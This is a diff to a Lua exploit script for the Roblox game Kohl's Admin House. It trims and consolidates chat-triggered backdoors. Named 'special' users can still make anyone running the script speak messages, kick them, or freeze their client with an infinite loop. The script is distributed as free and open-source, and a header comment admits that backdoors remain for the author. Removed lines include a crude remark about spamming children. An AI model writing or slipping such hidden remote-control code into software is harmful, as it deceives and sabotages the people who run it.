@@ -11,8 +11,10 @@
 -- You can play KAH here: https://www.roblox.com/games/112420803/Kohls-Admin-House-NBC-Updated
 -- Created by ScriptingProgrammer (Roblox) / TS2021x (Discord) / S-PScripts (GitHub)
 
--- Support this script today by donating Robux to me!
--- Please do not "skid" off this code by changing the name and removing the dev section. It makes me annoyed!
+-- There are no watermarks anymore in this script and there are no longer backdoors for anyone except me ;)
+
+-- Support this script today by donating Robux to me (especially since this script has limited advertising now)
+-- Please do not "skid" off this code by removing the dev section. It makes me annoyed!
 -- You can make your own script instead of skidding and you can take stuff from here if necessary.
 
 -- Don't go abusing like crazy with this script. I made this free/open-source and don't want idiots doing stuff that make me make this paid/obfuscated.
@@ -245,30 +247,7 @@ local specialperms = {
     "me_123eq",
     "me_crashking",
     "ScriptingProgrammer",
-    "t_echr",
-    "3cxos",
-    "ripcxo",
-    "t_echl",
-    "D_ionte",
-    "EternitHD",
-    "Milderous",
-    "DionteIsCute",
-    "Dekryptionite",
-    "Redstoneboy2008",
-    "decryptionites",
-    "atprog",
-    "3cxos",
-    "Di33le2",
-    "s_pisafurry",
-    "Palamode",
-    "grimAuxiliatrix",
-    "ikbx",
-    "undertaker629",
-    "Eggkid7",
-    "kevin3050ti", 
-    "E4_DQ", 
-    "me_capybara", 
-    "YT_MATHEUSMODZ5"
+    "s_pisafurry"
 }
 
 -- New users get blacklisted (prevent crashers)
@@ -8311,73 +8290,26 @@ v.Chatted:Connect(function(msg)
 
                 -- // dev \\ --
 
-                if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
+                if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                                 Speak("I use KohlsLite!")
                 end
 
-                if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-				    if not table.find(nokick,game.Players.LocalPlayer.Name) then
-           			    Speak("I use KohlsLite!")
-				    end
-                end  
-
-		if string.sub(msg:lower(), 0, 4) == "-hrc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "dawninja21" or v.Name == "dawninja21alt" or v.Name == "darkmadeboy") then
-                                Speak("[Hydra.lua]: Hydra.lua on top!")
-                end
-
-                if string.sub(msg:lower(), 0, 4) == "-hrk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "dawninja21" then
-                                game.Players.LocalPlayer:Kick("[Hydra.lua]: DarkSpecies has kicked you from the game.")
-		end
-
-                if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "atprog" then
-                                 Speak("pr on top")
-                end
-
-                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
-                                pcall(function()
-                                        game.Players.LocalPlayer:Kick("SkiddingProgrammer {kohlslite owner} kicked you from the game!")
-                                end)
-                end  
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(nokick,game.Players.LocalPlayer.Name) then
                                 pcall(function()
-                                        game.Players.LocalPlayer:Kick("You were kicked by a KohlsLite admin!")
+                                        game.Players.LocalPlayer:Kick("SkiddyProgrammer {kohlslite owner} kicked you from the game!")
                                 end)
-                        end
                 end  
-
-                if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "atprog" then
-                                        game.Players.LocalPlayer:Kick("[PR Script]: atprog kicked you from the game!")
-                end  
-
-                       if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
-                                    Remind("You have been warned!")
-                end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                Remind("[PR Script]: You have been warned!")
+                                    Remind("You have been warned by KohlsLite owner!")
                 end
 
-                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-                                     while true do end
-                                -- game:Shutdown()
-                end
-                
-                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
+                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                                      while true do end
                                 -- game:Shutdown()
                 end
 
-                if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
-                                 Speak("Spamming like how I spammed little kids")
-                end
-
-                if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-                        if not table.find(nokick,game.Players.LocalPlayer.Name) then
-                                Speak("Spamming like how I spammed little kids")
-                        end
-                end
 
                 end)
 -- ADMIN
@@ -12769,8 +12701,6 @@ startupScripts()
 local function rankcheck(username)
     if username == "ScriptingProgrammer" or username == "me_123eq" then
         return "Owner"
-    elseif table.find(specialperms, username) then
-	return "Admin"
     else
         return "Member"
     end
